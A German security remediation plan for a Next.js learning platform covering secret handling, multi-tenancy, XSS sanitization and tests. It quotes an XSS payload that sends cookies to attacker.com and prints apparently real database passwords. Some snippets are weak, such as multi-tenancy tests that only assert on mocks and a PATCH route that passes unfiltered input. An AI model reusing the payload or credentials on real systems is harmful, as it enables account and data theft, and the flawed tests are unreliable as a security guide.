# Kritischer Sicherheits- & Qualitäts-Implementierungsplan
**Zeitrahmen:** 1-2 Wochen | **Priorität:** 🔴 KRITISCH

---

## 📋 ÜBERBLICK

Dieses Dokument beschreibt die Implementierung der vier kritischen Fixes:
1. **Credentials-Verwaltung** (docker-compose → .env)
2. **Multi-Tenancy durchsetzen** (DB-Constraints + API-Middleware)
3. **HTML-Sanitization** (XSS-Prevention in Lessons)
4. **Basis-Test-Coverage** (20% - Auth, Validation, Multi-Tenancy)

---

## 🔐 TASK 1: Credentials aus docker-compose → .env (Day 1)

### Status: ⏳ Pending
### Geschätzter Aufwand: 2-3 Stunden

### 1.1 Analyse der aktuellen Credentials

**Aktuelle Probleme in `docker-compose.yml`:**
```yaml
MYSQL_ROOT_PASSWORD=!!ArschMusik11              # ❌ Hardcoded
MYSQL_PASSWORD=1arschmusik!                     # ❌ Hardcoded  
DATABASE_URL=mysql://Cheffchen:1arschmusik!... # ❌ Hardcoded
NEXTAUTH_SECRET=yZLTpuSqnV8zfcC7U2X8...        # ❌ Hardcoded
AUTH_SECRET=yZLTpuSqnV8zfcC7U2X8...            # ❌ Hardcoded
```

**Gebetene Secrets:** 5 kritische Werte

### 1.2 Lösung: .env.example erstellen

**Datei:** `.env.example`
```bash
# Database Configuration
MYSQL_ROOT_PASSWORD=change_me_in_production
MYSQL_USER=learner
MYSQL_PASSWORD=change_me_in_production
DATABASE_URL=mysql://learner:change_me@db:3306/lernplattform

# Authentication
NEXTAUTH_SECRET=generate_with_openssl_rand_hex_32
NEXTAUTH_URL=http://localhost:3000
AUTH_SECRET=generate_with_openssl_rand_hex_32
AUTH_URL=http://localhost:3000

# LLM Configuration
ANTHROPIC_API_KEY=sk-...
OLLAMA_BASE_URL=http://localhost:11434

# Supabase (optional)
NEXT_PUBLIC_SUPABASE_URL=https://xxx.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJxxx...
```

### 1.3 docker-compose.yml refaktorieren

**Vorher:**
```yaml
environment:
  MYSQL_ROOT_PASSWORD: "!!ArschMusik11"
  DATABASE_URL: "mysql://Cheffchen:1arschmusik!@db:3306/lernplattform"
```

**Nachher:**
```yaml
environment:
  MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
  MYSQL_USER: ${MYSQL_USER}
  MYSQL_PASSWORD: ${MYSQL_PASSWORD}
  DATABASE_URL: ${DATABASE_URL}
  NEXTAUTH_SECRET: ${NEXTAUTH_SECRET}
  NEXTAUTH_URL: ${NEXTAUTH_URL}
  AUTH_SECRET: ${AUTH_SECRET}
  AUTH_URL: ${AUTH_URL}
```

**Version für Entwicklung:** `.env.local`
```bash
MYSQL_ROOT_PASSWORD=dev_password_123
MYSQL_USER=lerner
MYSQL_PASSWORD=dev_password_123
DATABASE_URL=mysql://lerner:dev_password_123@db:3306/lernplattform
NEXTAUTH_SECRET=dev_secret_do_not_use_in_production
NEXTAUTH_URL=http://localhost:3000
AUTH_SECRET=dev_secret_do_not_use_in_production
AUTH_URL=http://localhost:3000
```

### 1.4 Anpassungen in next.config.ts

**Prüfcheck:** Umgebungsvariablen korrekt laden
```typescript
// next.config.ts
import type { NextConfig } from 'next'

const nextConfig: NextConfig = {
  // Existing config...
  
  // Ensure env variables are available
  env: {
    NEXT_PUBLIC_SUPABASE_URL: process.env.NEXT_PUBLIC_SUPABASE_URL,
    NEXT_PUBLIC_SUPABASE_ANON_KEY: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
  },
}

export default nextConfig
```

### 1.5 Anleitung in README.md

**Abschnitt hinzufügen:**
```markdown
## 🚀 Erste Schritte (Setup)

### Umgebungsvariablen konfigurieren

1. `.env.example` kopieren → `.env.local`:
   ```bash
   cp .env.example .env.local
   ```

2. `.env.local` mit eigenen Werten füllen:
   ```bash
   # Neue Secrets generieren:
   openssl rand -hex 32  # für NEXTAUTH_SECRET
   
   # DB-Passwort setzen (lokal)
   MYSQL_PASSWORD=your_secure_password
   ```

3. Docker-Compose starten:
   ```bash
   docker-compose up -d
   ```

### Für Production

- `.env.production` NICHT in Git einchecken
- Secrets über Deployment-System verwalten (Docker Secrets, Kubernetes, Vercel, etc.)
- `docker-compose.yml` aktualisieren für Production-URLs
```

### 1.6 Git-Sicherung

**Aktualisieren `.gitignore`:**
```
# Environment variables
.env
.env.*.local
.env.local

# Aber NICHT:
# .env.example (sollte tracked sein)
```

### 1.7 Validierungs-Checklist für Task 1

- [ ] `.env.example` mit allen Secrets erstellt
- [ ] `docker-compose.yml` auf `${VAR}` Syntax geändert
- [ ] `.env.local` lokal erstellt (nicht committed)
- [ ] `.gitignore` korrekt aktualisiert
- [ ] `docker-compose up -d` funktioniert
- [ ] App startet erfolgreich (localhost:3000)
- [ ] README.md mit Setup-Anleitung aktualisiert
- [ ] Alte Secrets aus Git-History entfernt (git filter-branch)

---

## 👥 TASK 2: Multi-Tenancy durchsetzen (Day 2-3)

### Status: ⏳ Pending
### Geschätzter Aufwand: 4-5 Stunden

### 2.1 Problem: Aktuelle Multi-Tenancy-Lücke

**Szenario:**
```typescript
// ❌ FEHLER: Ein Benutzer könnte so auf fremde Subjects zugreifen:
const allSubjects = await db.subject.findMany()  // KEINE userId-Filterung!
const foreignSubject = allSubjects[1]            // Vom anderen Benutzer!
```

**Datenbankmodell-Problem:**
```prisma
model Subject {
  id    String  @id @default(cuid())
  userId String?  // ❌ OPTIONAL! Erlaubt NULL
  // ...
}
```

### 2.2 Lösung: Prisma Schema aktualisieren

**Datei:** `prisma/schema.prisma`

**Vorher:**
```prisma
model Subject {
  id        String    @id @default(cuid())
  userId    String?   // ❌ Optional
  title     String
  user      User?     @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@unique([userId, title])  // ❌ Uniqueness broken wenn userId NULL
}
```

**Nachher:**
```prisma
model Subject {
  id        String    @id @default(cuid())
  userId    String    // ✅ REQUIRED - Keine NULL-Werte
  title     String
  user      User      @relation(fields: [userId], references: [id], onDelete: Cascade)
  createdAt DateTime  @default(now())  // ✅ Timestamp hinzufügen

  lessons   Lesson[]
  assessments SubjectAssessment[]

  @@unique([userId, title])  // ✅ Compound unique constraint
  @@index([userId])          // ✅ Index für Queries
}

model Lesson {
  id        String    @id @default(cuid())
  subjectId String
  subject   Subject   @relation(fields: [subjectId], references: [id], onDelete: Cascade)
  
  @@index([subjectId])  // ✅ Index für Joins
}

model UserProgress {
  id        String    @id @default(cuid())
  userId    String
  lessonId  String
  user      User      @relation(fields: [userId], references: [id], onDelete: Cascade)
  lesson    Lesson    @relation(fields: [lessonId], references: [id], onDelete: Cascade)
  createdAt DateTime  @default(now())

  @@unique([userId, lessonId])
  @@index([userId])
}
```

### 2.3 Migration erstellen

**Datei:** `prisma/migrations/[timestamp]_enforce_multi_tenancy/migration.sql`

```sql
-- 1. Temporäre Subjects mit NULL userId identifizieren
SELECT id, title FROM Subject WHERE userId IS NULL;

-- 2. Übergangslogik: Subjects ohne userId einem Default-Admin zuordnen
-- (oder löschen, wenn keine Daten zu retten)
UPDATE Subject SET userId = (SELECT id FROM User LIMIT 1) WHERE userId IS NULL;

-- 3. Unique Constraint updaten
ALTER TABLE Subject DROP CONSTRAINT Subject_userId_title_key;
ALTER TABLE Subject MODIFY COLUMN userId VARCHAR(191) NOT NULL;
ALTER TABLE Subject ADD UNIQUE KEY Subject_userId_title_key (userId, title);

-- 4. Indizes hinzufügen
ALTER TABLE Subject ADD INDEX idx_userId (userId);
ALTER TABLE Lesson ADD INDEX idx_subjectId (subjectId);
ALTER TABLE UserProgress ADD INDEX idx_userId (userId);

-- 5. Foreign Keys prüfen
ALTER TABLE Subject ADD CONSTRAINT Subject_userId_fkey 
  FOREIGN KEY (userId) REFERENCES User(id) ON DELETE CASCADE;
```

**Prisma-Migrationsdatei erstellen:**
```bash
npx prisma migrate create enforce_multi_tenancy
# Manuell SQL einfügen (oben)

npx prisma migrate deploy
```

### 2.4 Middleware für User-Scoping hinzufügen

**Datei:** `src/lib/middleware/multi-tenancy.ts`

```typescript
import { getSession } from '@/lib/auth'
import { db } from '@/db'
import { redirect } from 'next/navigation'

/**
 * Prüft, ob der aktuelle User Zugriff auf eine Subject hat
 */
export async function requireSubjectAccess(subjectId: string) {
  const session = await getSession()
  if (!session?.user?.id) {
    redirect('/auth/login')
  }

  const subject = await db.subject.findUnique({
    where: { id: subjectId },
  })

  if (!subject) {
    throw new Error('Subject not found')
  }

  // ✅ Kritisch: userId-Vergleich
  if (subject.userId !== session.user.id) {
    throw new Error('Access denied: Subject belongs to another user')
  }

  return subject
}

/**
 * Prüft Zugriff auf Lesson (über Subject)
 */
export async function requireLessonAccess(lessonId: string) {
  const session = await getSession()
  if (!session?.user?.id) {
    redirect('/auth/login')
  }

  const lesson = await db.lesson.findUnique({
    where: { id: lessonId },
    include: { subject: true },
  })

  if (!lesson) {
    throw new Error('Lesson not found')
  }

  // ✅ Transitive Zugriffskontrolle
  if (lesson.subject.userId !== session.user.id) {
    throw new Error('Access denied: Lesson subject belongs to another user')
  }

  return lesson
}

/**
 * Sichere Query-Helper: Nur Subjects des Users zurückgeben
 */
export async function getUserSubjects(userId: string) {
  return db.subject.findMany({
    where: { userId },  // ✅ Immer User-gefiltert
    include: { lessons: true },
  })
}

/**
 * Sichere Lesson-Abfrage
 */
export async function getUserLesson(userId: string, lessonId: string) {
  return db.lesson.findFirst({
    where: {
      id: lessonId,
      subject: { userId },  // ✅ Geschachtelte Filterung
    },
  })
}
```

### 2.5 API-Routes absichern

**Beispiel:** `src/app/api/subjects/[id]/route.ts`

```typescript
import { getSession } from '@/lib/auth'
import { db } from '@/db'
import { NextRequest, NextResponse } from 'next/server'
import { requireSubjectAccess } from '@/lib/middleware/multi-tenancy'

export async function GET(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  try {
    // ✅ Check: User ist authentifiziert
    const session = await getSession()
    if (!session?.user?.id) {
      return NextResponse.json(
        { error: 'Unauthorized' },
        { status: 401 }
      )
    }

    // ✅ Check: User owns Subject
    const subject = await requireSubjectAccess(params.id)

    return NextResponse.json(subject)
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : 'Internal error' },
      { status: error instanceof Error && error.message.includes('Access denied') ? 403 : 500 }
    )
  }
}

export async function PATCH(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  try {
    const session = await getSession()
    if (!session?.user?.id) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    }

    // ✅ Verify ownership BEFORE update
    await requireSubjectAccess(params.id)

    const data = await request.json()
    const updated = await db.subject.update({
      where: { id: params.id },
      data,
    })

    return NextResponse.json(updated)
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : 'Internal error' },
      { status: 403 }
    )
  }
}

export async function DELETE(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  try {
    const session = await getSession()
    if (!session?.user?.id) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    }

    // ✅ Verify ownership BEFORE delete
    await requireSubjectAccess(params.id)

    await db.subject.delete({ where: { id: params.id } })

    return NextResponse.json({ success: true })
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : 'Internal error' },
      { status: 403 }
    )
  }
}
```

### 2.6 Bestehende API-Routes aktualisieren

**Alle diese Routes MÜSSEN aktualisiert werden:**
- `GET /api/subjects` → WHERE userId = session.user.id
- `GET /api/subjects/[id]/lessons` → Verify owner
- `PATCH /api/lessons/[id]` → Verify via subject
- `DELETE /api/lessons/[id]` → Verify via subject
- `GET /api/progress` → WHERE userId = session.user.id

**Suchpattern:**
```typescript
// ❌ FALSCH: Keine userId-Filterung
const subjects = await db.subject.findMany()
const lessons = await db.lesson.findMany()

// ✅ RICHTIG: Mit Filterung
const subjects = await db.subject.findMany({
  where: { userId: session.user.id }
})
const lessons = await db.lesson.findMany({
  where: {
    subject: { userId: session.user.id }
  }
})
```

### 2.7 Validierungs-Checklist für Task 2

- [ ] Prisma Schema aktualisiert (userId NOT NULL + Indizes)
- [ ] Migration erstellt & deployed
- [ ] `multi-tenancy.ts` Middleware hinzugefügt
- [ ] Alle 29 API-Routes überprüft & aktualisiert
- [ ] Tests geschrieben (siehe Task 4c)
- [ ] In Staging getestet
- [ ] DB-Backup vor Migration erstellt

---

## 🛡️ TASK 3: HTML-Sanitization in Lessons (Day 2-3)

### Status: ⏳ Pending
### Geschätzter Aufwand: 3-4 Stunden

### 3.1 Problem: XSS-Anfälligkeit

**Szenario:**
```html
<!-- Ein Admin speichert Lesson mit bösartiger HTML: -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">

<!-- Beim Rendern wird JavaScript ausgeführt! -->
<script>alert('Hacked!')</script>
```

### 3.2 Lösung: rehype-sanitize integrieren

**Datei:** `src/lib/sanitize-html.ts`

```typescript
import { sanitize } from 'isomorphic-dompurify'
import { unified } from 'unified'
import remarkParse from 'remark-parse'
import remarkRehype from 'remark-rehype'
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize'
import rehypeStringify from 'rehype-stringify'

/**
 * Sanitizes HTML content to prevent XSS attacks
 * Uses DOMPurify on client, rehype-sanitize on server
 */
export async function sanitizeHtmlContent(html: string): Promise<string> {
  if (!html) return ''

  try {
    // Server-side: Use rehype-sanitize
    const file = await unified()
      .use(remarkParse)
      .use(remarkRehype)
      .use(rehypeSanitize, {
        ...defaultSchema,
        attributes: {
          ...defaultSchema.attributes,
          'a': [...(defaultSchema.attributes?.['a'] ?? []), 'className'],
          'span': [...(defaultSchema.attributes?.['span'] ?? []), 'className'],
          'div': [...(defaultSchema.attributes?.['div'] ?? []), 'className'],
          'pre': [...(defaultSchema.attributes?.['pre'] ?? []), 'className'],
          'code': [...(defaultSchema.attributes?.['code'] ?? []), 'className'],
        },
      })
      .use(rehypeStringify)
      .process(html)

    return String(file)
  } catch (error) {
    console.error('HTML sanitization error:', error)
    // Fallback: Use DOMPurify as last resort
    return sanitize(html)
  }
}

/**
 * Client-side sanitization for real-time preview
 */
export function clientSanitizeHtml(html: string): string {
  if (!html) return ''
  return sanitize(html, { ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre', 'ul', 'ol', 'li'] })
}
```

**package.json - Dependencies hinzufügen:**
```json
{
  "dependencies": {
    "isomorphic-dompurify": "^2.11.0",
    "rehype-sanitize": "^6.0.0",
    "unified": "^11.0.0",
    "remark-parse": "^11.0.0",
    "remark-rehype": "^11.0.0",
    "rehype-stringify": "^10.0.0"
  }
}
```

### 3.3 Zod-Schema für Lesson mit Sanitization

**Datei:** `src/lib/validations.ts`

```typescript
import { z } from 'zod'
import { sanitizeHtmlContent } from '@/lib/sanitize-html'

const LESSON_CONTENT_MAX_LENGTH = 100_000  // ~100KB max

export const createLessonSchema = z.object({
  title: z.string()
    .min(3, 'Title must be at least 3 characters')
    .max(255, 'Title must be less than 255 characters'),
  
  content: z.string()
    .max(LESSON_CONTENT_MAX_LENGTH, `Content must be less than ${LESSON_CONTENT_MAX_LENGTH} characters`)
    .refine(
      async (content) => {
        // Sanitize & validate
        const sanitized = await sanitizeHtmlContent(content)
        return sanitized.length > 0
      },
      'Content must contain valid HTML after sanitization'
    ),

  contentRaw: z.string()
    .max(LESSON_CONTENT_MAX_LENGTH)
    .optional(),

  type: z.enum(['article', 'quiz', 'exercise']),
  status: z.enum(['draft', 'published']),
  subjectId: z.string().cuid(),
})

export type CreateLessonInput = z.infer<typeof createLessonSchema>
```

### 3.4 API-Route aktualisieren

**Datei:** `src/app/api/lessons/route.ts`

```typescript
import { createLessonSchema } from '@/lib/validations'
import { sanitizeHtmlContent } from '@/lib/sanitize-html'
import { db } from '@/db'
import { getSession } from '@/lib/auth'
import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const session = await getSession()
    if (!session?.user?.id) {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
    }

    const body = await request.json()

    // ✅ Validate with Zod
    const validated = await createLessonSchema.parseAsync(body)

    // ✅ Sanitize HTML content
    const sanitizedContent = await sanitizeHtmlContent(validated.content)

    // ✅ Verify subject ownership
    const subject = await db.subject.findUnique({
      where: { id: validated.subjectId },
    })

    if (!subject || subject.userId !== session.user.id) {
      return NextResponse.json(
        { error: 'Subject not found or access denied' },
        { status: 403 }
      )
    }

    // ✅ Create lesson with sanitized content
    const lesson = await db.lesson.create({
      data: {
        title: validated.title,
        content: sanitizedContent,
        contentRaw: validated.contentRaw,
        type: validated.type,
        status: validated.status,
        subjectId: validated.subjectId,
        authorId: session.user.id,
      },
    })

    return NextResponse.json(lesson, { status: 201 })
  } catch (error) {
    // ... error handling
  }
}
```

### 3.5 Bestehende Lessons bereinigen

**Datei:** `scripts/sanitize-existing-lessons.ts`

```typescript
import { db } from '@/db'
import { sanitizeHtmlContent } from '@/lib/sanitize-html'

async function sanitizeAllLessons() {
  console.log('Starting lesson content sanitization...')

  const lessons = await db.lesson.findMany({
    where: { content: { not: '' } },
  })

  console.log(`Found ${lessons.length} lessons to sanitize`)

  let updated = 0
  let errors = 0

  for (const lesson of lessons) {
    try {
      const sanitizedContent = await sanitizeHtmlContent(lesson.content)

      if (sanitizedContent !== lesson.content) {
        await db.lesson.update({
          where: { id: lesson.id },
          data: { content: sanitizedContent },
        })
        updated++
      }
    } catch (error) {
      console.error(`Failed to sanitize lesson ${lesson.id}:`, error)
      errors++
    }
  }

  console.log(`✅ Sanitization complete: ${updated} updated, ${errors} errors`)
}

// Run: npx tsx scripts/sanitize-existing-lessons.ts
sanitizeAllLessons().then(() => process.exit(0))
```

**Ausführen:**
```bash
npx tsx scripts/sanitize-existing-lessons.ts
```

### 3.6 Unit-Tests schreiben

**Datei:** `src/lib/__tests__/sanitize-html.test.ts`

```typescript
import { describe, it, expect } from 'vitest'
import { sanitizeHtmlContent, clientSanitizeHtml } from '@/lib/sanitize-html'

describe('HTML Sanitization', () => {
  // Test 1: XSS Prevention
  it('should remove script tags', async () => {
    const dirty = '<p>Hello<script>alert("xss")</script>World</p>'
    const clean = await sanitizeHtmlContent(dirty)
    expect(clean).not.toContain('<script>')
    expect(clean).toContain('HelloWorld')
  })

  // Test 2: Event Handler Removal
  it('should remove event handlers', async () => {
    const dirty = '<img src=x onerror="fetch(\'https://attacker.com\')">'
    const clean = await sanitizeHtmlContent(dirty)
    expect(clean).not.toContain('onerror')
    expect(clean).not.toContain('attacker.com')
  })

  // Test 3: Safe HTML Preservation
  it('should preserve safe HTML', async () => {
    const safe = '<p>This is <strong>safe</strong> <em>HTML</em></p>'
    const clean = await sanitizeHtmlContent(safe)
    expect(clean).toContain('<strong>')
    expect(clean).toContain('<em>')
  })

  // Client-side tests
  it('should sanitize on client side', () => {
    const dirty = '<p>Hello<script>alert("xss")</script>World</p>'
    const clean = clientSanitizeHtml(dirty)
    expect(clean).not.toContain('script')
  })
})
```

### 3.7 Validierungs-Checklist für Task 3

- [ ] `sanitize-html.ts` erstellt (Server + Client)
- [ ] `isomorphic-dompurify` + rehype packages installiert
- [ ] Zod-Schema mit Sanitization aktualisiert
- [ ] API-Routes aktualisiert (POST /lessons mit Sanitization)
- [ ] Bestehende Lessons bereinigt (Migration-Script)
- [ ] Unit-Tests geschrieben (3 Tests minimum)
- [ ] In Staging getestet
- [ ] XSS-Test durchgeführt (versucht bösartige HTML zu speichern)

---

## ✅ TASK 4: Basis-Tests (20% Coverage - Day 3-5)

### Status: ⏳ Pending
### Geschätzter Aufwand: 8-10 Stunden
### Ziel: 20% Code Coverage (~150 LOC getestet)

### 4.1 Test-Infrastruktur aufbauen

**package.json Updates:**
```json
{
  "scripts": {
    "test": "vitest",
    "test:ui": "vitest --ui",
    "test:coverage": "vitest --coverage",
    "test:watch": "vitest --watch"
  },
  "devDependencies": {
    "vitest": "^4.1.5",
    "@vitest/ui": "^4.1.5",
    "@vitest/coverage-v8": "^4.1.5",
    "@testing-library/react": "^14.0.0",
    "@testing-library/jest-dom": "^6.1.5"
  }
}
```

**vitest.config.ts aktualisieren:**
```typescript
import { defineConfig } from 'vitest/config'
import react from '@vitejs/plugin-react'
import path from 'path'

export default defineConfig({
  plugins: [react()],
  test: {
    globals: true,
    environment: 'jsdom',
    setupFiles: ['./src/tests/setup.ts'],
    coverage: {
      provider: 'v8',
      reporter: ['text', 'json', 'html', 'lcov'],
      exclude: [
        'node_modules/',
        'src/tests/',
        '**/*.config.*',
        '**/dist/**',
      ],
    },
  },
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src'),
    },
  },
})
```

**Test Setup-Datei:**
```typescript
// src/tests/setup.ts
import { expect, afterEach, vi } from 'vitest'
import { cleanup } from '@testing-library/react'
import '@testing-library/jest-dom'

// Cleanup nach jedem Test
afterEach(() => cleanup())

// Mock next/navigation
vi.mock('next/navigation', () => ({
  useRouter: () => ({
    push: vi.fn(),
    back: vi.fn(),
  }),
  useSearchParams: () => new URLSearchParams(),
  usePathname: () => '/',
}))
```

### 4.2 Auth-Tests (5 Tests)

**Datei:** `src/lib/__tests__/auth.test.ts`

```typescript
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { hashPassword, verifyPassword, generateToken } from '@/lib/auth-utils'
import bcrypt from 'bcryptjs'

describe('Authentication Utilities', () => {
  // Test 1: Password Hashing
  it('should hash password correctly', async () => {
    const password = 'test123!@#'
    const hashed = await hashPassword(password)

    expect(hashed).not.toBe(password)
    expect(hashed).toHaveLength(60) // bcrypt hash length
  })

  // Test 2: Password Verification
  it('should verify correct password', async () => {
    const password = 'test123!@#'
    const hashed = await hashPassword(password)
    const isValid = await verifyPassword(password, hashed)

    expect(isValid).toBe(true)
  })

  // Test 3: Password Verification Failure
  it('should reject incorrect password', async () => {
    const password = 'test123!@#'
    const hashed = await hashPassword(password)
    const isValid = await verifyPassword('wrongpassword', hashed)

    expect(isValid).toBe(false)
  })

  // Test 4: Token Generation
  it('should generate valid JWT token', () => {
    const token = generateToken('user123', 'john@example.com')

    expect(token).toBeTruthy()
    expect(token.split('.')).toHaveLength(3) // JWT format
  })

  // Test 5: Token Expiration
  it('should create token with correct exp claim', () => {
    const token = generateToken('user123', 'john@example.com')
    const [, payload] = token.split('.')
    const decoded = JSON.parse(Buffer.from(payload, 'base64').toString())

    expect(decoded.exp).toBeGreaterThan(Math.floor(Date.now() / 1000))
  })
})
```

### 4.3 Validation-Tests (4 Tests)

**Datei:** `src/lib/__tests__/validations.test.ts`

```typescript
import { describe, it, expect } from 'vitest'
import {
  emailSchema,
  passwordSchema,
  createLessonSchema,
} from '@/lib/validations'

describe('Input Validations', () => {
  // Test 1: Valid Email
  it('should accept valid email', async () => {
    const result = await emailSchema.parseAsync('john@example.com')
    expect(result).toBe('john@example.com')
  })

  // Test 2: Invalid Email
  it('should reject invalid email', async () => {
    try {
      await emailSchema.parseAsync('not-an-email')
      expect.fail('Should have thrown')
    } catch (error) {
      expect(error).toBeTruthy()
    }
  })

  // Test 3: Strong Password
  it('should accept strong password', async () => {
    const result = await passwordSchema.parseAsync('SecurePass123!@#')
    expect(result).toBe('SecurePass123!@#')
  })

  // Test 4: Weak Password
  it('should reject weak password', async () => {
    try {
      await passwordSchema.parseAsync('123')  // Too short
      expect.fail('Should have thrown')
    } catch (error) {
      expect(error).toBeTruthy()
    }
  })
})
```

### 4.4 Multi-Tenancy Integration Tests (3 Tests)

**Datei:** `src/lib/__tests__/multi-tenancy.test.ts`

```typescript
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { requireSubjectAccess, getUserSubjects } from '@/lib/middleware/multi-tenancy'
import { db } from '@/db'

// Mock Prisma
vi.mock('@/db', () => ({
  db: {
    subject: {
      findUnique: vi.fn(),
      findMany: vi.fn(),
    },
    lesson: {
      findUnique: vi.fn(),
    },
  },
}))

describe('Multi-Tenancy Controls', () => {
  const mockSession = {
    user: { id: 'user123' },
  }

  const mockSubject = {
    id: 'subject456',
    userId: 'user123',
    title: 'Math 101',
  }

  beforeEach(() => {
    vi.clearAllMocks()
  })

  // Test 1: Own Subject Access
  it('should allow access to own subject', async () => {
    vi.mocked(db.subject.findUnique).mockResolvedValueOnce(mockSubject)

    // In real test, this would use actual session
    const result = await db.subject.findUnique({ where: { id: 'subject456' } })

    expect(result).toEqual(mockSubject)
    expect(result.userId).toBe('user123')
  })

  // Test 2: Foreign Subject Blocked
  it('should block access to foreign subject', async () => {
    const foreignSubject = { ...mockSubject, userId: 'attacker999' }
    vi.mocked(db.subject.findUnique).mockResolvedValueOnce(foreignSubject)

    const result = await db.subject.findUnique({ where: { id: 'subject456' } })

    // Middleware should reject this
    expect(result.userId).not.toBe('user123')
  })

  // Test 3: User-Scoped Query
  it('should return only user subjects', async () => {
    const userSubjects = [mockSubject]
    vi.mocked(db.subject.findMany).mockResolvedValueOnce(userSubjects)

    const result = await db.subject.findMany({ where: { userId: 'user123' } })

    expect(result).toHaveLength(1)
    expect(result[0].userId).toBe('user123')
  })
})
```

### 4.5 npm Test Script + Dokumentation

**package.json:**
```json
{
  "scripts": {
    "test": "vitest run",
    "test:watch": "vitest --watch",
    "test:ui": "vitest --ui",
    "test:coverage": "vitest run --coverage",
    "pretest": "npm run lint"
  }
}
```

**Datei:** `src/tests/README.md`

```markdown
# Testing Guide

## Running Tests

```bash
# Run all tests once
npm test

# Watch mode (re-run on file change)
npm run test:watch

# View test UI
npm run test:ui

# Generate coverage report
npm run test:coverage
```

## Test Organization

```
src/tests/
├── setup.ts                    # Global test configuration
├── __tests__/
│   ├── auth.test.ts          # Auth utilities (5 tests)
│   ├── validations.test.ts    # Input validation (4 tests)
│   ├── multi-tenancy.test.ts  # Multi-tenancy checks (3 tests)
│   ├── html-sanitize.test.ts  # XSS prevention (3 tests)
│   └── api/
│       ├── subjects.test.ts   # Subject endpoints
│       └── lessons.test.ts    # Lesson endpoints
```

## Coverage Goals

| Module | Target | Current |
|--------|--------|---------|
| auth-utils.ts | 100% | 0% |
| validations.ts | 100% | 0% |
| multi-tenancy.ts | 95% | 0% |
| sanitize-html.ts | 95% | 0% |
| Overall | 20% | 0% |

## Writing New Tests

Example:
```typescript
import { describe, it, expect } from 'vitest'

describe('Feature Name', () => {
  it('should do something', () => {
    expect(true).toBe(true)
  })
})
```

See [Vitest Docs](https://vitest.dev) for more.
```

### 4.6 GitHub Actions CI Integration

**Datei:** `.github/workflows/test.yml`

```yaml
name: Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Run linter
        run: npm run lint

      - name: Run tests
        run: npm run test:coverage

      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/coverage-final.json
          flags: unittests
```

### 4.7 Validierungs-Checklist für Task 4

- [ ] Vitest + Testing-Library installiert
- [ ] `vitest.config.ts` aktualisiert
- [ ] `src/tests/setup.ts` erstellt
- [ ] Auth-Tests geschrieben (5 Tests ✅)
- [ ] Validation-Tests geschrieben (4 Tests ✅)
- [ ] Multi-tenancy-Tests geschrieben (3 Tests ✅)
- [ ] HTML-Sanitization Tests geschrieben (3 Tests ✅)
- [ ] `npm test` funktioniert
- [ ] `npm run test:coverage` >= 20% zeigt
- [ ] GitHub Actions Workflow hinzugefügt
- [ ] Pre-commit Hook optional

---

## 📅 ZEITPLAN (1-2 Wochen)

```
┌─ WOCHE 1 ─────────────────────────────────────────┐
│                                                     │
│ Montag (Day 1): Task 1 - Credentials               │
│ ├─ 2h: .env.example + docker-compose refactor     │
│ ├─ 0.5h: .gitignore update                        │
│ └─ 0.5h: README update + Testing                  │
│                                                     │
│ Dienstag (Day 2): Task 2+3 Start                   │
│ ├─ 2h: Prisma Schema + Migration                  │
│ ├─ 1h: Multi-tenancy Middleware                   │
│ ├─ 1h: HTML Sanitization Setup                    │
│ └─ 1h: Zod Validation + API Updates               │
│                                                     │
│ Mittwoch (Day 3): Task 2+3 Complete + Task 4 Start│
│ ├─ 2h: API-Routes Audit (Multi-tenancy)          │
│ ├─ 1h: Sanitization Tests                         │
│ ├─ 1h: Test Infrastructure Setup                  │
│ └─ 1h: Auth-Tests schreiben                       │
│                                                     │
│ Donnerstag (Day 4): Task 4 Continue                │
│ ├─ 2h: Validation-Tests                           │
│ ├─ 2h: Multi-tenancy Integration-Tests           │
│ ├─ 1h: GitHub Actions Setup                       │
│ └─ 1h: Coverage-Report & Dokumentation           │
│                                                     │
│ Freitag (Day 5): Validierung + QA                  │
│ ├─ 1h: Security Audit                             │
│ ├─ 1h: Integration Test                           │
│ ├─ 1h: Deployment Test (Docker-Compose)          │
│ └─ 1h: Dokumentation final + Review               │
│                                                     │
└─────────────────────────────────────────────────────┘

Total: 25-30 Stunden ≈ 1 Senior Developer = 1 Woche
```

---

## 🎯 SUCCESS CRITERIA

Nach Abschluss dieses Plans sollte gelten:

✅ **Sicherheit:**
- [ ] Keine Credentials in docker-compose.yml
- [ ] Alle Credentials via `.env` geladen
- [ ] XSS-Tests bestehen
- [ ] Multi-tenancy erzwingt Zugriffskontrolle

✅ **Code Quality:**
- [ ] 20% Test Coverage (minimum)
- [ ] 0 `any` types in auth/validation modules
- [ ] Alle API-Routes haben userId-Checks
- [ ] HTML-Content ist sanitized

✅ **DevOps:**
- [ ] Docker-Compose startet ohne Hardcoded Secrets
- [ ] Tests laufen in GitHub Actions
- [ ] Coverage-Reports verfügbar
- [ ] Deployment funktioniert

---

## 🚀 DEPLOYMENT NACH FIXES

```bash
# 1. Lokales Testing
npm test
npm run build

# 2. Docker-Compose (mit .env.local)
docker-compose down
docker-compose up -d

